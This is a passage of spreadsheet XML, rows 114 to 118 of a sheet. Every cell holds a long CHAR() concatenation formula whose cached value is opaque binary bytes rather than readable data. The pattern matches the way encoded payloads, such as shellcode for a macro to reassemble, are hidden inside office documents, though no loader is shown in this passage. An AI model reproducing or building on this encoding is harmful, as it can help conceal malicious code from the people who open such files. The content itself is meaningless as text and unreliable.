(116)&amp;CHAR(159)&amp;CHAR(49)&amp;CHAR(202)&amp;CHAR(136)&amp;CHAR(89)&amp;CHAR(41)&amp;CHAR(29)&amp;CHAR(136)&amp;CHAR(48)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(253)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(136)&amp;CHAR(149)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(111)&amp;CHAR(51)&amp;CHAR(8)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(203)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(127)&amp;CHAR(128)&amp;CHAR(202)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(227)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(122)&amp;CHAR(51)&amp;CHAR(21)&amp;CHAR(132)&amp;CHAR(251)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(220)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(59)&amp;CHAR(23)&amp;CHAR(22)&amp;CHAR(199)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(26)&amp;CHAR(134)&amp;CHAR(87)&amp;CHAR(48)&amp;CHAR(37)&amp;CHAR(137)&amp;CHAR(70)&amp;CHAR(51)&amp;CHAR(38)&amp;CHAR(6)&amp;CHAR(197)&amp;CHAR(6)&amp;CHAR(207)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(39)&amp;CHAR(35)&amp;CHAR(136)&amp;CHAR(9)&amp;CHAR(189)&amp;CHAR(136)&amp;CHAR(203)&amp;CHAR(253)&amp;CHAR(132)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(27)&amp;CHAR(141)&amp;CHAR(12)&amp;CHAR(87)&amp;CHAR(5)&amp;CHAR(196)&amp;CHAR(85)&amp;CHAR(237)&amp;CHAR(221)&amp;CHAR(10)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(93)&amp;CHAR(91)&amp;CHAR(151)&amp;CHAR(209)&amp;CHAR(114)&amp;CHAR(30)&amp;CHAR(140)&amp;CHAR(78)&amp;CHAR(35)&amp;CHAR(29)&amp;CHAR(128)&amp;CHAR(236)&amp;CHAR(1)&amp;CHAR(143)&amp;CHAR(78)&amp;CHAR(39)&amp;CHAR(19)&amp;CHAR(137)&amp;CHAR(233)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(148)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(153)&amp;CHAR(151)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(224)&amp;CHAR(198)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(45)&amp;CHAR(39)&amp;CHAR(141)&amp;CHAR(65)&amp;CHAR(55)&amp;CHAR(29)&amp;CHAR(10)&amp;CHAR(181)&amp;CHAR(78)&amp;CHAR(122)&amp;CHAR(252)&amp;CHAR(142)</f>
        <v>ÈM._x0019_-_x000F_qo‹A_x0003_þH_x000D_¾_x0006_Ý6_x0001_õ_x0002_
‹V!_x0013_c:E&amp;#v&amp;†Ç.ô_x000E__x000D__x0005_ŒG"_x001C__x0006__x0005_‰	5_x0006_E._x001E_F6_x0001__x0005__x0001_Ž_x0006_7ŽO _x0011_í_x0004_»_x000B__x001A__x0006__x0002_k:Ô_x0006_‰ _x0015__x0004__x0005_ˆÇ_x0008_€V_x0005__x0001_ÊŽJ)_x0007_:Íw ;_x0005_ˆÜtŸ1ÊˆY)_x001D_ˆ0_x0002__x0002_€ý_x0003__x0006__x000C_ˆ•_x0006__x0003__x0005__x0005_o3_x0008__x000B_†Ë_x0011__x0006__x0002_ŒE€Ê_x000B_ã
_x0003__x000B_z3_x0015_„û_x0006_ŽÜ_x0014__x0004__x0005_€B;_x0017__x0016_Ç‹M#_x001A_†W0%‰F3&amp;_x0006_Å_x0006_ÏˆN'#ˆ	½ˆËý„A!_x001B__x000C_W_x0005_ÄUíÝ
_x0002_][—Ñr_x001E_ŒN#_x001D_€ì_x0001_N'_x0013_‰é_x0003__x0002_…”	
_x0005_™—_x0001__x000D__x0006_
àÆŠF-'A7_x001D_
µNzüŽ</v>
      </c>
      <c r="C114" t="str">
        <f>CHAR(191)&amp;CHAR(118)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(175)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)</f>
        <v>¿vôS…`¯Îßý</v>
      </c>
    </row>
    <row r="115" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B115" t="str">
        <f>CHAR(7)&amp;CHAR(132)&amp;CHAR(2)&amp;CHAR(199)&amp;CHAR(139)&amp;CHAR(71)&amp;CHAR(39)&amp;CHAR(37)&amp;CHAR(121)&amp;CHAR(117)&amp;CHAR(97)&amp;CHAR(75)&amp;CHAR(185)&amp;CHAR(13)&amp;CHAR(53)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(86)&amp;CHAR(100)&amp;CHAR(185)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(54)&amp;CHAR(197)&amp;CHAR(89)&amp;CHAR(245)&amp;CHAR(87)&amp;CHAR(56)&amp;CHAR(137)&amp;CHAR(234)&amp;CHAR(148)&amp;CHAR(249)&amp;CHAR(118)&amp;CHAR(80)&amp;CHAR(98)&amp;CHAR(187)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(66)&amp;CHAR(46)&amp;CHAR(55)&amp;CHAR(91)&amp;CHAR(93)&amp;CHAR(238)&amp;CHAR(202)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(132)&amp;CHAR(137)&amp;CHAR(13)&amp;CHAR(28)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(185)&amp;CHAR(15)&amp;CHAR(29)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(246)&amp;CHAR(115)&amp;CHAR(34)&amp;CHAR(57)&amp;CHAR(236)&amp;CHAR(214)&amp;CHAR(109)&amp;CHAR(190)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(54)&amp;CHAR(216)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(233)&amp;CHAR(201)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(142)&amp;CHAR(193)&amp;CHAR(47)&amp;CHAR(99)&amp;CHAR(1)&amp;CHAR(205)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(80)&amp;CHAR(81)&amp;CHAR(243)&amp;CHAR(80)&amp;CHAR(70)&amp;CHAR(233)&amp;CHAR(18)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(91)&amp;CHAR(104)&amp;CHAR(5)&amp;CHAR(253)&amp;CHAR(102)&amp;CHAR(53)&amp;CHAR(50)&amp;CHAR(1)&amp;CHAR(193)&amp;CHAR(245)&amp;CHAR(215)&amp;CHAR(238)&amp;CHAR(4)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(46)&amp;CHAR(9)&amp;CHAR(197)&amp;CHAR(244)&amp;CHAR(218)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(205)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(58)&amp;CHAR(202)&amp;CHAR(85)&amp;CHAR(66)&amp;CHAR(251)&amp;CHAR(80)&amp;CHAR(75)&amp;CHAR(88)&amp;CHAR(85)&amp;CHAR(86)&amp;CHAR(78)&amp;CHAR(128)&amp;CHAR(198)&amp;CHAR(213)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(208)&amp;CHAR(128)&amp;CHAR(233)&amp;CHAR(218)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(86)&amp;CHAR(136)&amp;CHAR(153)&amp;CHAR(37)&amp;CHAR(225)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(80)&amp;CHAR(91)&amp;CHAR(82)&amp;CHAR(136)&amp;CHAR(176)&amp;CHAR(13)&amp;CHAR(8)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(139)&amp;CHAR(191)&amp;CHAR(77)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(113)&amp;CHAR(7)&amp;CHAR(130)&amp;CHAR(60)&amp;CHAR(137)&amp;CHAR(135)&amp;CHAR(66)&amp;CHAR(21)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(49)&amp;CHAR(248)&amp;CHAR(96)&amp;CHAR(3)&amp;CHAR(109)&amp;CHAR(3)&amp;CHAR(52)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(135)&amp;CHAR(7)&amp;CHAR(78)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(81)&amp;CHAR(83)&amp;CHAR(246)&amp;CHAR(89)&amp;CHAR(57)&amp;CHAR(159)&amp;CHAR(236)&amp;CHAR(128)&amp;CHAR(230)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(137)&amp;CHAR(22)&amp;CHAR(20)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(91)&amp;CHAR(87)&amp;CHAR(104)&amp;CHAR(250)&amp;CHAR(142)&amp;CHAR(139)&amp;CHAR(25)&amp;CHAR(24)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(90)&amp;CHAR(250)&amp;CHAR(88)&amp;CHAR(91)&amp;CHAR(140)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(65)&amp;CHAR(138)&amp;CHAR(66)&amp;CHAR(40)&amp;CHAR(29)&amp;CHAR(139)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(29)&amp;CHAR(85)&amp;CHAR(90)&amp;CHAR(226)</f>
        <v>_x0007_„_x0002_Ç‹G'%yuaK¹_x000D_5_x0005__x0003_Vd¹_x0006__x0002__x0005_6ÅYõW8‰ê”ùvPb»_x0005__x0003__x0004_ˆB.7[]îÊ_x0008__x0001__x0004_„‰_x000D__x001C__x0004__x0005_[ù¹_x000F__x001D__x0001__x0002_ös"9ìÖm¾
_x0002__x0002_6ØVVéÉ_x0006__x0003__x0005_ŽÁ/c_x0001_Í_x0005__x0005_PQóPFé_x0012_ŽB![h_x0005_ýf52_x0001_Áõ×î_x0004_B.	ÅôÚn_x0002_Í_x0001__x0004_:ÊUBûPKXUVN€ÆÕ_x0007__x0006__x000D_Ð€éÚ
_x0002__x0002_Vˆ™%á_x0002__x0003__x0003_P[Rˆ°_x000D__x0008__x0005__x0005__x0002_‹¿M_x0001__x0002__x0005_q_x0007_‚&lt;‰‡B_x0015__x0011__x0006_1ø`_x0003_m_x0003_4_x0005__x0006_‡_x0007_N_x0008__x0006__x0002__x000D_QSöY9Ÿì€æ	Ž4_x0014__x0001__x0002_‚‰_x0016__x0014__x0013__x0001__x0006_Ë[WhúŽ‹_x0019__x0018__x0002__x0003_RRZúX[ŒI!AŠB(_x001D_‹F!_x001D_UZâ</v>
      </c>
      <c r="C115" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(106)&amp;CHAR(121)&amp;CHAR(115)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(83)</f>
        <v>ô6…jys÷ýôS</v>
      </c>
    </row>
    <row r="116" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B116" t="str">
        <f>CHAR(78)&amp;CHAR(238)&amp;CHAR(253)&amp;CHAR(237)&amp;CHAR(156)&amp;CHAR(66)&amp;CHAR(38)&amp;CHAR(127)&amp;CHAR(131)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(47)&amp;CHAR(137)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(38)&amp;CHAR(83)&amp;CHAR(88)&amp;CHAR(226)&amp;CHAR(248)&amp;CHAR(240)&amp;CHAR(242)&amp;CHAR(254)&amp;CHAR(135)&amp;CHAR(205)&amp;CHAR(26)&amp;CHAR(140)&amp;CHAR(104)&amp;CHAR(32)&amp;CHAR(37)&amp;CHAR(92)&amp;CHAR(81)&amp;CHAR(245)&amp;CHAR(152)&amp;CHAR(189)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(130)&amp;CHAR(198)&amp;CHAR(2)&amp;CHAR(150)&amp;CHAR(201)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(85)&amp;CHAR(140)&amp;CHAR(130)&amp;CHAR(158)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(93)&amp;CHAR(111)&amp;CHAR(8)&amp;CHAR(92)&amp;CHAR(140)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(92)&amp;CHAR(250)&amp;CHAR(149)&amp;CHAR(174)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(202)&amp;CHAR(13)&amp;CHAR(129)&amp;CHAR(166)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(75)&amp;CHAR(46)&amp;CHAR(23)&amp;CHAR(136)&amp;CHAR(71)&amp;CHAR(32)&amp;CHAR(17)&amp;CHAR(86)&amp;CHAR(135)&amp;CHAR(128)&amp;CHAR(183)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(93)&amp;CHAR(138)&amp;CHAR(21)&amp;CHAR(88)&amp;CHAR(245)&amp;CHAR(23)&amp;CHAR(145)&amp;CHAR(196)&amp;CHAR(112)&amp;CHAR(124)&amp;CHAR(141)&amp;CHAR(78)&amp;CHAR(47)&amp;CHAR(1)&amp;CHAR(81)&amp;CHAR(137)&amp;CHAR(1)&amp;CHAR(248)&amp;CHAR(87)&amp;CHAR(1)&amp;CHAR(150)&amp;CHAR(193)&amp;CHAR(112)&amp;CHAR(93)&amp;CHAR(129)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(21)&amp;CHAR(142)&amp;CHAR(81)&amp;CHAR(37)&amp;CHAR(25)&amp;CHAR(139)&amp;CHAR(79)&amp;CHAR(39)&amp;CHAR(53)&amp;CHAR(95)&amp;CHAR(84)&amp;CHAR(128)&amp;CHAR(10)&amp;CHAR(254)&amp;CHAR(93)&amp;CHAR(9)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(115)&amp;CHAR(68)&amp;CHAR(136)&amp;CHAR(133)&amp;CHAR(206)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(89)&amp;CHAR(245)&amp;CHAR(81)&amp;CHAR(116)&amp;CHAR(137)&amp;CHAR(94)&amp;CHAR(53)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(255)&amp;CHAR(96)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(20)&amp;CHAR(249)&amp;CHAR(88)&amp;CHAR(35)&amp;CHAR(92)&amp;CHAR(129)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(94)&amp;CHAR(117)&amp;CHAR(55)&amp;CHAR(246)&amp;CHAR(143)&amp;CHAR(243)&amp;CHAR(97)&amp;CHAR(39)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(34)&amp;CHAR(30)&amp;CHAR(92)&amp;CHAR(66)&amp;CHAR(86)&amp;CHAR(137)&amp;CHAR(1)&amp;CHAR(80)&amp;CHAR(81)&amp;CHAR(90)&amp;CHAR(68)&amp;CHAR(86)&amp;CHAR(80)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(83)&amp;CHAR(22)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(112)&amp;CHAR(13)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(19)&amp;CHAR(111)&amp;CHAR(15)&amp;CHAR(85)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(92)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(34)&amp;CHAR(24)&amp;CHAR(85)&amp;CHAR(141)&amp;CHAR(10)&amp;CHAR(250)&amp;CHAR(84)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(20)&amp;CHAR(82)&amp;CHAR(153)&amp;CHAR(25)&amp;CHAR(249)&amp;CHAR(83)&amp;CHAR(27)&amp;CHAR(129)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(84)&amp;CHAR(142)&amp;CHAR(14)&amp;CHAR(245)&amp;CHAR(82)&amp;CHAR(3)&amp;CHAR(129)&amp;CHAR(133)&amp;CHAR(66)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(132)&amp;CHAR(14)&amp;CHAR(64)</f>
        <v>NîýíœB&amp;ƒC!/‰A"&amp;SXâøðòþ‡Í_x001A_Œh %\Qõ˜½_x0001__x0002_	‚Æ_x0002_–É_x0005__x0002_
F!_x0013_UŒ‚ž_x0007__x0003__x0005_]o_x0008_\ŒŽy_x0001__x0003__x0006_\ú•®_x0005__x0005__x0005_ŒÊ_x000D_¦_x0012__x0011__x0006_‰K._x0017_ˆG _x0011_V‡€·_x000E__x0006__x0002_]Š_x0015_Xõ_x0017_‘Äp|N/_x0001_Q‰_x0001_øW_x0001_–Áp]N&amp;_x0015_ŽQ%_x0019_‹O'5_T€
þ]	€ÃsDˆ…Î_x0006__x0005__x0005_YõQt‰^5_x0016_‰ÿ`_x0005_RR_x0014_ùX#\öý^u7öóa'ŽO"_x001E_\BV‰_x0001_PQZDVPRõS_x0016_€Ãp_x000D_ŠF'_x0013_o_x000F_U€_x0003_þ\_x0011_ŽG"_x0018_U
úT_x000D_‚N&amp;_x0014_R™_x0019_ùS_x001B_C!_x0013_TŽ_x000E_õR_x0003_…B
_x0001__x0004_„_x000E_@</v>
      </c>
      <c r="C116" t="str">
        <f>CHAR(133)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(106)</f>
        <v>…`·Îßýô6…j</v>
      </c>
    </row>
    <row r="117" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B117" t="str">
        <f>CHAR(22)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(86)&amp;CHAR(93)&amp;CHAR(94)&amp;CHAR(253)&amp;CHAR(20)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(133)&amp;CHAR(201)&amp;CHAR(31)&amp;CHAR(105)&amp;CHAR(5)&amp;CHAR(194)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(252)&amp;CHAR(86)&amp;CHAR(65)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(94)&amp;CHAR(88)&amp;CHAR(132)&amp;CHAR(201)&amp;CHAR(221)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(206)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(15)&amp;CHAR(85)&amp;CHAR(89)&amp;CHAR(83)&amp;CHAR(141)&amp;CHAR(118)&amp;CHAR(33)&amp;CHAR(25)&amp;CHAR(82)&amp;CHAR(138)&amp;CHAR(180)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(16)&amp;CHAR(139)&amp;CHAR(188)&amp;CHAR(79)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(119)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(57)&amp;CHAR(129)&amp;CHAR(133)&amp;CHAR(75)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(62)&amp;CHAR(236)&amp;CHAR(110)&amp;CHAR(13)&amp;CHAR(98)&amp;CHAR(5)&amp;CHAR(36)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(2)&amp;CHAR(79)&amp;CHAR(9)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(82)&amp;CHAR(249)&amp;CHAR(91)&amp;CHAR(47)&amp;CHAR(138)&amp;CHAR(221)&amp;CHAR(135)&amp;CHAR(209)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(212)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(19)&amp;CHAR(26)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(194)&amp;CHAR(90)&amp;CHAR(82)&amp;CHAR(103)&amp;CHAR(250)&amp;CHAR(136)&amp;CHAR(140)&amp;CHAR(30)&amp;CHAR(21)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(83)&amp;CHAR(80)&amp;CHAR(80)&amp;CHAR(250)&amp;CHAR(95)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(81)&amp;CHAR(253)&amp;CHAR(132)&amp;CHAR(185)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(199)&amp;CHAR(10)&amp;CHAR(134)&amp;CHAR(131)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(22)&amp;CHAR(82)&amp;CHAR(128)&amp;CHAR(135)&amp;CHAR(232)&amp;CHAR(13)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(68)&amp;CHAR(110)&amp;CHAR(4)&amp;CHAR(94)&amp;CHAR(139)&amp;CHAR(140)&amp;CHAR(215)&amp;CHAR(17)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(248)&amp;CHAR(144)&amp;CHAR(161)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(135)&amp;CHAR(202)&amp;CHAR(119)&amp;CHAR(99)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(140)&amp;CHAR(86)&amp;CHAR(39)&amp;CHAR(35)&amp;CHAR(87)&amp;CHAR(94)&amp;CHAR(85)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(156)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(197)&amp;CHAR(115)&amp;CHAR(66)&amp;CHAR(99)&amp;CHAR(60)&amp;CHAR(105)&amp;CHAR(45)&amp;CHAR(42)&amp;CHAR(118)&amp;CHAR(61)&amp;CHAR(137)&amp;CHAR(94)&amp;CHAR(53)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(19)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(130)&amp;CHAR(249)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(91)&amp;CHAR(129)&amp;CHAR(23)&amp;CHAR(83)&amp;CHAR(242)&amp;CHAR(19)&amp;CHAR(129)&amp;CHAR(201)&amp;CHAR(127)&amp;CHAR(37)&amp;CHAR(159)&amp;CHAR(64)&amp;CHAR(33)&amp;CHAR(27)&amp;CHAR(139)&amp;CHAR(94)&amp;CHAR(47)&amp;CHAR(13)&amp;CHAR(83)&amp;CHAR(253)&amp;CHAR(125)&amp;CHAR(35)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(27)&amp;CHAR(81)&amp;CHAR(250)&amp;CHAR(147)&amp;CHAR(134)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(21)&amp;CHAR(82)</f>
        <v>_x0016__x0004__x0005__x000B_V]^ý_x0014__x0006_	_x0007_…É_x001F_i_x0005_Â
_x0002_UPüVA^\^X„ÉÝ_x000B__x000B__x0001_Î†é_x000F_UYSv!_x0019_RŠ´_x000E__x0001__x0002__x0012__x0010_‹¼O_x000D__x0007__x0005_w_x0006_Ž9…K_x000D__x0006__x0002_&gt;ìn_x000D_b_x0005_$_x0004__x0005_†_x0002_O	_x0015__x0001__x0002_YRù[/ŠÝ‡Ñ_x000D_†Ô_x0003__x0005__x0001_Š_x0013__x001A__x0005__x000D__x0006_ÂZRgúˆŒ_x001E__x0015__x0005__x0006_SPPú_ZWQý„¹_x0006__x0002__x0007_Ç
†ƒ_x0005__x0006_
ŽO._x0016_R€‡è_x000D_
_x0005_Dn_x0004_^‹Œ×_x0011__x0001__x0002_Yø¡_x0013__x0001__x0005_‡ÊwcŽG!_x0011_ŒV'#W^U€_x0003_þœ_x0001__x0004__x0003__x0006_‰ÅsBc&lt;i-*v=‰^5_x0016_C._x0013_UŽ‚ù_x0002_
_x0003_[_x0017_Sò_x0013_É%Ÿ@!_x001B_‹^/_x000D_Sý}#_x001E_†_x001B_Qú“†_x0002__x0002__x0005_ˆA%_x0015_R</v>
      </c>
      <c r="C117" t="str">
        <f>CHAR(122)&amp;CHAR(123)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(70)&amp;CHAR(226)&amp;CHAR(68)&amp;CHAR(123)</f>
        <v>z{÷ýô~FâD{</v>
      </c>
    </row>
    <row r="118" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B118" t="str">
        <f>CHAR(136)&amp;CHAR(11)&amp;CHAR(250)&amp;CHAR(92)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(79)&amp;CHAR(37)&amp;CHAR(29)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(13)&amp;CHAR(249)&amp;CHAR(148)&amp;CHAR(181)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(129)&amp;CHAR(132)&amp;CHAR(68)&amp;CHAR(5)&amp;CHAR(18)&amp;CHAR(17)&amp;CHAR(139)&amp;CHAR(6)&amp;CHAR(66)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(84)&amp;CHAR(80)&amp;CHAR(85)&amp;CHAR(226)&amp;CHAR(251)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(201)&amp;CHAR(13)&amp;CHAR(108)&amp;CHAR(9)&amp;CHAR(202)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(244)&amp;CHAR(80)&amp;CHAR(74)&amp;CHAR(84)&amp;CHAR(75)&amp;CHAR(92)&amp;CHAR(89)&amp;CHAR(138)&amp;CHAR(195)&amp;CHAR(10)&amp;CHAR(206)&amp;CHAR(152)&amp;CHAR(69)&amp;CHAR(33)&amp;CHAR(14)&amp;CHAR(205)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(50)&amp;CHAR(193)&amp;CHAR(192)&amp;CHAR(19)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(15)&amp;CHAR(32)&amp;CHAR(69)&amp;CHAR(41)&amp;CHAR(13)&amp;CHAR(198)&amp;CHAR(136)&amp;CHAR(66)&amp;CHAR(40)&amp;CHAR(1)&amp;CHAR(159)&amp;CHAR(245)&amp;CHAR(121)&amp;CHAR(33)&amp;CHAR(13)&amp;CHAR(202)&amp;CHAR(226)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(18)&amp;CHAR(73)&amp;CHAR(133)&amp;CHAR(234)&amp;CHAR(2)&amp;CHAR(201)&amp;CHAR(82)&amp;CHAR(142)&amp;CHAR(239)&amp;CHAR(96)&amp;CHAR(164)&amp;CHAR(54)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(57)&amp;CHAR(207)&amp;CHAR(84)&amp;CHAR(134)&amp;CHAR(65)&amp;CHAR(8)&amp;CHAR(130)&amp;CHAR(122)&amp;CHAR(9)&amp;CHAR(255)&amp;CHAR(36)&amp;CHAR(128)&amp;CHAR(194)&amp;CHAR(115)&amp;CHAR(41)&amp;CHAR(244)&amp;CHAR(96)&amp;CHAR(25)&amp;CHAR(253)&amp;CHAR(124)&amp;CHAR(19)&amp;CHAR(249)&amp;CHAR(120)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(112)&amp;CHAR(14)&amp;CHAR(90)&amp;CHAR(253)&amp;CHAR(119)&amp;CHAR(13)&amp;CHAR(235)&amp;CHAR(137)&amp;CHAR(236)&amp;CHAR(254)&amp;CHAR(253)&amp;CHAR(136)&amp;CHAR(53)&amp